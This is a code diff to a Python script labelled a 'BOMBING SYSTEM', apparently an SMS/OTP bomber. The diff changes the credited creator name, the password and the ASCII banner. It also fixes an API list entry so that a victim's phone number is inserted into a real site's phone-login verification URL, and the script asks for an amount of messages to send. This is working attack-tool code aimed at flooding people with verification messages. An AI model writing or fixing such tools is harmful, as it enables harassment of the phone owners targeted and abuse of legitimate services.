@@ -1,15 +1,15 @@
 import os, time, threading, requests
 
 # --- Settings ---
-NAME = "JANINA"
-PASSWORD = "kire"
+NAME = "CYBERSECURITY"
+PASSWORD = "takbir"
 HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
 
 def banner():
     os.system("clear" if os.name == "posix" else "cls")
     print("\033[1;32m")
     # Real Shadow Banner Engine
-    print(r"""      ██╗   █████╗   ███╗  ██╗  ██╗  ███╗  ██╗   █████╗  \n      ██║  ██╔══██╗  ████╗ ██║  ██║  ████╗ ██║  ██╔══██╗ \n      ██║  ███████║  ██╔██╗██║  ██║  ██╔██╗██║  ███████║ \n ██   ██║  ██╔══██║  ██║╚████║  ██║  ██║╚████║  ██╔══██║ \n ╚█████╔╝  ██║  ██║  ██║ ╚███║  ██║  ██║ ╚███║  ██║  ██║ """)
+    print(r"""  ██████╗  ╚██╗ ██╔╝  ██████╗   ███████╗  ██████╗    ██████╗  ███████╗   ██████╗  ██╗  ██╗  ██████╗   ██╗  ████████╗  ╚██╗ ██╔╝ \n ██╔════╝   ╚████╔╝   ██╔══██╗  ██╔════╝  ██╔══██╗  ██╔════╝  ██╔════╝  ██╔════╝  ██║  ██║  ██╔══██╗  ██║  ╚══██╔══╝   ╚████╔╝  \n ██║         ╚██╔╝    ██████╔╝  █████╗    ██████╔╝  ╚█████╗   █████╗    ██║       ██║  ██║  ██████╔╝  ██║     ██║       ╚██╔╝   \n ██║          ██║     ██╔══██╗  ██╔══╝    ██╔══██╗   ╚═══██╗  ██╔══╝    ██║       ██║  ██║  ██╔══██╗  ██║     ██║        ██║    \n ╚██████╗     ╚═╝     ██████╔╝  ███████╗  ██║  ██╗  ██████╔╝  ███████╗  ╚██████╗  ╚██████╔╝  ██║  ██╗  ██║     ╚═╝        ╚═╝    """)
     print("=" * 60)
     print(f"       CREATED BY: {NAME} BOMBING SYSTEM")
     print("=" * 60 + "\033[0m")
@@ -41,7 +41,7 @@ def start():
     amount = int(input("ENTER AMOUNT: "))
     
     api_list = [
-        {"url": f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=", "method": "GET"},
+        {"url": f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}", "method": "GET"},
 
     ]
 
